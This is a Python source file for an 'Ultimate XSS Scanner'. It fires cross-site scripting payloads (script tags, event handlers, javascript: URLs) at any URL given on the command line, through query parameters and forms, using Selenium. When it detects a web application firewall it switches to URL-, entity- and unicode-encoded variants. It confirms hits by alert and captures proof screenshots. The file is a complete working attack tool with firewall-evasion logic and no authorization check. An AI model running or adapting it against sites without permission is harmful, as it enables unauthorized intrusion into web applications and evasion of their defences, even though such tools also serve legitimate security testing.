#!/usr/bin/env python3
"""
Ultimate XSS Scanner - Fixed Version
- Smart payload selection (simple first, then encoded if WAF detected)
- Proper form detection
- Fixed alert handling
- Optimized WebDriver management
"""

import requests
import time
import random
import base64
import urllib.parse
import re
from urllib.parse import urlparse, parse_qs
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoAlertPresentException, TimeoutException
from webdriver_manager.chrome import ChromeDriverManager
from bs4 import BeautifulSoup
import logging
from datetime import datetime
import os
import threading
from concurrent.futures import ThreadPoolExecutor
import json

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ultimate_xss_scanner.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    END = '\033[0m'

class UltimateXSSScanner:
    """Ultimate XSS Scanner with proper payload strategy"""
    
    def __init__(self, target_url, max_threads=3):
        self.target_url = target_url
        self.max_threads = max_threads
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        self.driver = None
        self.unique_alert_id = f"ULTIMATE_XSS_{random.randint(10000, 99999)}"
        self.waf_detected = False
        self.vulnerabilities = []
        self.setup_selenium()
    
    def setup_selenium(self):
        """Setup Selenium WebDriver with optimized configuration"""
        try:
            chrome_options = Options()
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_argument('--disable-plugins')
            chrome_options.add_argument('--disable-images')
            chrome_options.add_argument('--disable-javascript-harmony-shipping')
            chrome_options.add_argument('--disable-background-networking')
            chrome_options.add_argument('--disable-background-timer-throttling')
            chrome_options.add_argument('--disable-renderer-backgrounding')
            chrome_options.add_argument('--disable-backgrounding-occluded-windows')
            chrome_options.add_argument('--disable-client-side-phishing-detection')
            chrome_options.add_argument('--disable-sync')
            chrome_options.add_argument('--disable-translate')
            chrome_options.add_argument('--hide-scrollbars')
            chrome_options.add_argument('--mute-audio')
            chrome_options.add_argument('--no-first-run')
            chrome_options.add_argument('--safebrowsing-disable-auto-update')
            chrome_options.add_argument('--ignore-certificate-errors')
            chrome_options.add_argument('--ignore-ssl-errors')
            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            chrome_options.add_argument('--window-size=1920,1080')
            chrome_options.add_argument('--headless')  # Run in headless mode for speed
            
            # Try to use existing ChromeDriver first
            try:
                self.driver = webdriver.Chrome(options=chrome_options)
                self.driver.set_page_load_timeout(30)
                logger.info(f"{Colors.GREEN}[SELENIUM] WebDriver initialized with system ChromeDriver{Colors.END}")
            except Exception as e1:
                logger.warning(f"{Colors.YELLOW}[SELENIUM] System ChromeDriver failed: {e1}{Colors.END}")
                
                # Try ChromeDriverManager as fallback
                try:
                    service = Service(ChromeDriverManager().install())
                    self.driver = webdriver.Chrome(service=service, options=chrome_options)
                    self.driver.set_page_load_timeout(30)
                    logger.info(f"{Colors.GREEN}[SELENIUM] WebDriver initialized with ChromeDriverManager{Colors.END}")
                except Exception as e2:
                    logger.error(f"{Colors.RED}[SELENIUM] All WebDriver initialization methods failed: {e2}{Colors.END}")
                    self.driver = None
                
        except Exception as e:
            logger.error(f"{Colors.RED}[SELENIUM] Error initializing WebDriver: {e}{Colors.END}")
            self.driver = None
    
    def detect_waf(self, url):
        """Detect if WAF is present by testing simple payloads"""
        logger.info(f"{Colors.BLUE}[WAF] Detecting WAF presence...{Colors.END}")
        
        # Simple test payloads
        test_payloads = [
            '<script>alert("test")</script>',
            '<img src=x onerror=alert("test")>',
            '<svg onload=alert("test")>'
        ]
        
        waf_indicators = 0
        
        for payload in test_payloads:
            try:
                # Test GET parameter
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                if query_params:
                    param_name = list(query_params.keys())[0]
                    query_params[param_name] = [payload]
                    new_query = urllib.parse.urlencode(query_params, doseq=True)
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                    
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check for WAF indicators
                    if any(indicator in response.text.lower() for indicator in [
                        'blocked', 'forbidden', 'access denied', 'security', 'waf',
                        'cloudflare', 'incapsula', 'akamai', 'barracuda'
                    ]):
                        waf_indicators += 1
                    
                    # Check if payload is filtered/encoded
                    if payload not in response.text and urllib.parse.quote(payload) not in response.text:
                        waf_indicators += 1
                        
            except Exception as e:
                logger.warning(f"{Colors.YELLOW}[WAF] Error testing WAF detection: {e}{Colors.END}")
        
        self.waf_detected = waf_indicators >= 2
        logger.info(f"{Colors.CYAN}[WAF] WAF detected: {self.waf_detected}{Colors.END}")
        return self.waf_detected
    
    def get_smart_payloads(self, context, waf_detected=False):
        """Get smart payloads - SIMPLE FIRST, then encoded if WAF detected"""
        
        # SIMPLE payloads for each context (ALWAYS TEST THESE FIRST)
        simple_payloads = {
            'html': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')">',
                '<body onload=alert("XSS")>'
            ],
            'attribute': [
                '" onmouseover="alert(\'XSS\')"',
                '" onfocus="alert(\'XSS\')" autofocus="',
                '" onload="alert(\'XSS\')"',
                '" onclick="alert(\'XSS\')"'
            ],
            'javascript': [
                ';alert("XSS");',
                '";alert("XSS");//',
                "';alert('XSS');//",
                '`;alert("XSS");//'
            ],
            'css': [
                'expression(alert("XSS"))',
                'url("javascript:alert(\'XSS\')")'
            ],
            'url': [
                'javascript:alert("XSS")',
                'data:text/html,<script>alert("XSS")</script>'
            ]
        }
        
        # Get base payloads for the context
        base_payloads = simple_payloads.get(context, simple_payloads['html'])
        
        # If WAF detected, add encoded variations
        if waf_detected:
            logger.info(f"{Colors.YELLOW}[PAYLOAD] WAF detected - adding encoded payloads{Colors.END}")
            encoded_payloads = []
            
            for payload in base_payloads:
                # Always add the original payload first
                encoded_payloads.append(payload)
                
                # Context-specific encoding
                if context == 'html':
                    # URL encoding
                    encoded_payloads.append(urllib.parse.quote(payload))
                    encoded_payloads.append(urllib.parse.quote_plus(payload))
                    # HTML entity encoding
                    hex_encoded = "".join([f"&#x{ord(c):02x};" for c in payload])
                    encoded_payloads.append(hex_encoded)
                    dec_encoded = "".join([f"&#{ord(c)};" for c in payload])
                    encoded_payloads.append(dec_encoded)
                    
                elif context == 'attribute':
                    # URL encoding and HTML entity encoding
                    encoded_payloads.append(urllib.parse.quote(payload))
                    hex_encoded = "".join([f"&#x{ord(c):02x};" for c in payload])
                    encoded_payloads.append(hex_encoded)
                    dec_encoded = "".join([f"&#{ord(c)};" for c in payload])
                    encoded_payloads.append(dec_encoded)
                    
                elif context == 'javascript':
                    # Unicode escape and URL encoding
                    unicode_encoded = "".join([f"\\u{ord(c):04x}" for c in payload])
                    encoded_payloads.append(unicode_encoded)
                    encoded_payloads.append(urllib.parse.quote(payload))
                    
                elif context == 'css':
                    # URL encoding
                    encoded_payloads.append(urllib.parse.quote(payload))
                    
                elif context == 'url':
                    # Double URL encoding
                    encoded_payloads.append(urllib.parse.quote(payload))
                    double_encoded = urllib.parse.quote(urllib.parse.quote(payload))
                    encoded_payloads.append(double_encoded)
            
            return list(set(encoded_payloads))
        else:
            # NO WAF - return only simple payloads
            logger.info(f"{Colors.GREEN}[PAYLOAD] No WAF detected - using simple payloads only{Colors.END}")
            return base_payloads
    
    def detect_context(self, url, parameter):
        """Detect XSS context for parameter"""
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Check if parameter is in form
            forms = soup.find_all('form')
            for form in forms:
                inputs = form.find_all(['input', 'textarea', 'select'])
                for input_tag in inputs:
                    if input_tag.get('name') == parameter:
                        input_type = input_tag.get('type', 'text').lower()
                        if input_type in ['text', 'search', 'email', 'url', 'tel']:
                            return 'html'
                        elif input_type in ['password', 'hidden']:
                            return 'attribute'
            
            # Check if parameter is in URL
            if parameter in url:
                if 'callback' in parameter.lower():
                    return 'javascript'
                elif 'redirect' in parameter.lower() or 'url' in parameter.lower():
                    return 'url'
                else:
                    return 'html'
            
            return 'html'  # Default context
            
        except Exception as e:
            logger.warning(f"{Colors.YELLOW}[CONTEXT] Error detecting context: {e}{Colors.END}")
            return 'html'
    
    def test_xss_ultimate(self, url, parameter, payload, context, method='GET'):
        """Ultimate XSS testing with proper alert handling"""
        if not self.driver:
            logger.warning(f"{Colors.YELLOW}[XSS] Chrome not available, using fallback{Colors.END}")
            return self.test_xss_fallback(url, parameter, payload, context, method)
        
        try:
            # Create unique payload
            unique_payload = payload.replace('alert("XSS")', f'alert("{self.unique_alert_id}")')
            unique_payload = unique_payload.replace("alert('XSS')", f"alert('{self.unique_alert_id}')")
            
            # Prepare test URL
            if method == 'GET':
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                query_params[parameter] = [unique_payload]
                new_query = urllib.parse.urlencode(query_params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            else:
                test_url = url
                # Handle POST form submission
                self.driver.get(test_url)
                try:
                    # Try to find form with the parameter
                    form = self.driver.find_element(By.CSS_SELECTOR, f'form input[name="{parameter}"]').find_element(By.XPATH, './..')
                    input_field = form.find_element(By.NAME, parameter)
                    input_field.clear()
                    input_field.send_keys(unique_payload)
                    form.submit()
                    time.sleep(2)
                except Exception as e:
                    logger.warning(f"{Colors.YELLOW}[XSS] Form submission failed: {e}{Colors.END}")
                    return False, test_url, None, None
                test_url = self.driver.current_url
            
            logger.info(f"{Colors.CYAN}[XSS] Testing: {test_url}{Colors.END}")
            logger.info(f"{Colors.CYAN}[PAYLOAD] {payload}{Colors.END}")
            
            if method == 'GET':
                self.driver.get(test_url)
            
            # Wait for page load and potential alert
            time.sleep(2)
            
            # Enhanced alert detection
            alert_detected = False
            alert_text = None
            screenshot_path = None
            
            # Try multiple times to catch alert
            for attempt in range(5):  # Increased attempts
                try:
                    # Wait for alert
                    WebDriverWait(self.driver, 1).until(EC.alert_is_present())
                    
                    # Switch to alert
                    alert = self.driver.switch_to.alert
                    alert_text = alert.text
                    
                    logger.info(f"{Colors.CYAN}[ALERT] Detected: {alert_text}{Colors.END}")
                    
                    # Check if it's our unique alert
                    if self.unique_alert_id in alert_text:
                        logger.info(f"{Colors.GREEN}[XSS] SUCCESS! Our alert detected: {alert_text}{Colors.END}")
                        
                        # Take screenshot BEFORE accepting alert
                        try:
                            screenshot_path = self.capture_screenshot(test_url, parameter, payload)
                            logger.info(f"{Colors.GREEN}[SCREENSHOT] PoC saved: {screenshot_path}{Colors.END}")
                        except Exception as screenshot_error:
                            logger.warning(f"{Colors.YELLOW}[XSS] Screenshot failed: {screenshot_error}{Colors.END}")
                        
                        # Accept alert
                        alert.accept()
                        alert_detected = True
                        break
                    else:
                        # Not our alert, dismiss it
                        alert.dismiss()
                        logger.info(f"{Colors.YELLOW}[XSS] Alert dismissed (not ours): {alert_text}{Colors.END}")
                        time.sleep(0.5)
                        
                except NoAlertPresentException:
                    # No alert present
                    break
                except Exception as e:
                    logger.warning(f"{Colors.YELLOW}[XSS] Alert handling error (attempt {attempt + 1}): {e}{Colors.END}")
                    time.sleep(0.5)
                    continue
            
            # If no alert, check for reflection
            if not alert_detected:
                try:
                    page_source = self.driver.page_source
                    if unique_payload in page_source:
                        if self.check_executable_context(page_source, unique_payload, context):
                            logger.info(f"{Colors.GREEN}[XSS] SUCCESS! Payload reflected in executable context{Colors.END}")
                            try:
                                screenshot_path = self.capture_screenshot(test_url, parameter, payload)
                                logger.info(f"{Colors.GREEN}[SCREENSHOT] PoC saved: {screenshot_path}{Colors.END}")
                            except Exception as screenshot_error:
                                logger.warning(f"{Colors.YELLOW}[XSS] Screenshot failed: {screenshot_error}{Colors.END}")
                            alert_detected = True
                            alert_text = "Reflected in context"
                except Exception as e:
                    logger.warning(f"{Colors.YELLOW}[XSS] Reflection check failed: {e}{Colors.END}")
            
            if alert_detected:
                logger.info(f"{Colors.GREEN}[VULN] XSS CONFIRMED in {test_url} parameter: {parameter}{Colors.END}")
                logger.info(f"{Colors.GREEN}[PAYLOAD] {payload}{Colors.END}")
                logger.info(f"{Colors.GREEN}[CONTEXT] {context}{Colors.END}")
                logger.info(f"{Colors.GREEN}[TEST_URL] {test_url}{Colors.END}")
                if alert_text:
                    logger.info(f"{Colors.GREEN}[ALERT] {alert_text}{Colors.END}")
                
                return True, test_url, alert_text, screenshot_path
            else:
                return False, test_url, None, None
                
        except Exception as e:
            logger.error(f"{Colors.RED}[XSS] Error testing with Chrome: {e}{Colors.END}")
            return False, None, None, None
    
    def test_xss_fallback(self, url, parameter, payload, context, method='GET'):
        """Fallback XSS testing when Chrome is not available"""
        try:
            unique_payload = payload.replace('alert("XSS")', f'alert("{self.unique_alert_id}")')
            unique_payload = unique_payload.replace("alert('XSS')", f"alert('{self.unique_alert_id}')")
            
            if method == 'GET':
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                query_params[parameter] = [unique_payload]
                new_query = urllib.parse.urlencode(query_params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                response = self.session.get(test_url, timeout=10)
            else:
                test_url = url
                response = self.session.post(test_url, data={parameter: unique_payload}, timeout=10)
            
            if unique_payload in response.text:
                if self.check_executable_context(response.text, unique_payload, context):
                    logger.info(f"{Colors.GREEN}[XSS] SUCCESS! Payload reflected in executable context (fallback){Colors.END}")
                    return True, test_url, "Reflected in context (fallback)", None
            
            return False, test_url, None, None
            
        except Exception as e:
            logger.error(f"{Colors.RED}[XSS] Fallback testing error: {e}{Colors.END}")
            return False, None, None, None
    
    def check_executable_context(self, page_source, payload, context):
        """Check if payload is in executable context"""
        try:
            if context == 'html':
                # Check for script tags or event handlers
                script_patterns = [
                    r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>',
                    r'on\w+\s*=\s*["\'].*?' + re.escape(payload) + r'.*?["\']',
                    r'<[^>]*' + re.escape(payload) + r'[^>]*>'
                ]
            elif context == 'javascript':
                # Check for JavaScript context
                script_patterns = [
                    r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>',
                    r'javascript\s*:\s*.*?' + re.escape(payload)
                ]
            elif context == 'attribute':
                # Check for attribute context
                script_patterns = [
                    r'<[^>]*\s+\w+\s*=\s*["\'].*?' + re.escape(payload) + r'.*?["\'][^>]*>'
                ]
            elif context == 'css':
                # Check for CSS context
                script_patterns = [
                    r'<style[^>]*>.*?' + re.escape(payload) + r'.*?</style>',
                    r'style\s*=\s*["\'].*?' + re.escape(payload) + r'.*?["\']'
                ]
            elif context == 'url':
                # Check for URL context
                script_patterns = [
                    r'href\s*=\s*["\'].*?' + re.escape(payload) + r'.*?["\']',
                    r'src\s*=\s*["\'].*?' + re.escape(payload) + r'.*?["\']'
                ]
            else:
                script_patterns = [re.escape(payload)]
            
            for pattern in script_patterns:
                if re.search(pattern, page_source, re.IGNORECASE | re.DOTALL):
                    return True
            
            return False
            
        except Exception as e:
            logger.warning(f"{Colors.YELLOW}[CONTEXT] Error checking executable context: {e}{Colors.END}")
            return False
    
    def capture_screenshot(self, test_url, parameter, payload):
        """Capture screenshot of XSS PoC"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"xss_poc_{timestamp}_{hash(payload) % 100000:05d}.png"
            
            # Create screenshots directory
            os.makedirs("xss_poc_screenshots", exist_ok=True)
            filepath = os.path.join("xss_poc_screenshots", filename)
            
            # Take screenshot
            self.driver.save_screenshot(filepath)
            
            return filepath
            
        except Exception as e:
            logger.error(f"{Colors.RED}[SCREENSHOT] Error capturing screenshot: {e}{Colors.END}")
            return None
    
    def scan_urls(self, urls):
        """Scan URLs for XSS vulnerabilities with proper strategy"""
        logger.info(f"{Colors.BLUE}[XSS] Scanning {len(urls)} URLs...{Colors.END}")
        
        for url_data in urls:
            url = url_data['url']
            params = url_data['parameters']
            
            logger.info(f"{Colors.CYAN}[URL] Testing URL: {url}{Colors.END}")
            
            # Detect WAF for this URL
            waf_detected = self.detect_waf(url)
            
            for param in params:
                # Detect context for this parameter
                context = self.detect_context(url, param)
                
                # Get smart payloads based on context and WAF detection
                payloads = self.get_smart_payloads(context, waf_detected)
                
                logger.info(f"{Colors.CYAN}[PARAM] Testing parameter: {param} (context: {context}, WAF: {waf_detected}){Colors.END}")
                logger.info(f"{Colors.CYAN}[PAYLOADS] Testing {len(payloads)} payloads{Colors.END}")
                
                for i, payload in enumerate(payloads, 1):
                    try:
                        logger.info(f"{Colors.CYAN}[PAYLOAD {i}/{len(payloads)}] {payload}{Colors.END}")
                        
                        is_vulnerable, test_url, alert_text, screenshot_path = self.test_xss_ultimate(
                            url, param, payload, context, 'GET'
                        )
                        
                        if is_vulnerable:
                            vulnerability = {
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'context': context,
                                'method': 'GET',
                                'alert_text': alert_text,
                                'screenshot': screenshot_path,
                                'waf_bypassed': waf_detected
                            }
                            self.vulnerabilities.append(vulnerability)
                            
                            # Move to next parameter after finding vulnerability
                            logger.info(f"{Colors.GREEN}[SUCCESS] Vulnerability found! Moving to next parameter...{Colors.END}")
                            break
                            
                    except Exception as e:
                        logger.error(f"{Colors.RED}[XSS] Error testing payload: {e}{Colors.END}")
                        continue
    
    def generate_report(self):
        """Generate comprehensive XSS vulnerability report"""
        logger.info(f"{Colors.BLUE}[REPORT] Generating XSS vulnerability report...{Colors.END}")
        
        if not self.vulnerabilities:
            logger.info(f"{Colors.YELLOW}[REPORT] No XSS vulnerabilities found{Colors.END}")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"ultimate_xss_report_{timestamp}.json"
        
        report_data = {
            'target': self.target_url,
            'scan_time': datetime.now().isoformat(),
            'total_vulnerabilities': len(self.vulnerabilities),
            'waf_detected': self.waf_detected,
            'vulnerabilities': self.vulnerabilities
        }
        
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)
        
        logger.info(f"{Colors.GREEN}[REPORT] Report saved: {report_file}{Colors.END}")
        
        # Print summary
        print(f"\n{Colors.GREEN}🎯 XSS SCAN SUMMARY{Colors.END}")
        print(f"{Colors.GREEN}Target: {self.target_url}{Colors.END}")
        print(f"{Colors.GREEN}Vulnerabilities found: {len(self.vulnerabilities)}{Colors.END}")
        print(f"{Colors.GREEN}WAF detected: {self.waf_detected}{Colors.END}")
        print(f"{Colors.GREEN}Report saved: {report_file}{Colors.END}")
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            print(f"\n{Colors.CYAN}[VULN {i}]{Colors.END}")
            print(f"URL: {vuln['url']}")
            print(f"Parameter: {vuln['parameter']}")
            print(f"Payload: {vuln['payload']}")
            print(f"Context: {vuln['context']}")
            print(f"Method: {vuln['method']}")
            if vuln['screenshot']:
                print(f"Screenshot: {vuln['screenshot']}")
    
    def cleanup(self):
        """Cleanup resources"""
        if self.driver:
            try:
                self.driver.quit()
                logger.info(f"{Colors.GREEN}[CLEANUP] Chrome WebDriver closed{Colors.END}")
            except Exception as e:
                logger.warning(f"{Colors.YELLOW}[CLEANUP] Error closing WebDriver: {e}{Colors.END}")

def main():
    """Main function"""
    import sys
    
    if len(sys.argv) != 2:
        print("Usage: python3 ultimate_xss_scanner.py <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║                  ULTIMATE XSS SCANNER                       ║
║              Smart Payload Strategy & WAF Bypass            ║
║                                                              ║
║  🎯 Simple Payloads First                                   ║
║  🛡️  WAF Detection & Encoded Payloads                       ║
║  📸 Enhanced Screenshot Capture                            ║
║  ⚡ Optimized Performance                                   ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    print(f"🎯 Target: {target_url}")
    print(f"🕐 Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    # Create scanner instance
    scanner = UltimateXSSScanner(target_url)
    
    try:
        # Test URLs with proper parameters
        test_urls = [
            {
                'url': target_url,
                'parameters': ['search', 'query', 'q', 'input', 'text']
            }
        ]
        
        # Scan for XSS vulnerabilities
        scanner.scan_urls(test_urls)
        
        # Generate report
        scanner.generate_report()
        
    except KeyboardInterrupt:
        logger.info(f"{Colors.YELLOW}[SCAN] Scan interrupted by user{Colors.END}")
    except Exception as e:
        logger.error(f"{Colors.RED}[SCAN] Scan error: {e}{Colors.END}")
    finally:
        scanner.cleanup()
        print(f"\n{Colors.GREEN}🔒 Ultimate XSS Scanner - Completed{Colors.END}")

if __name__ == "__main__":
    main()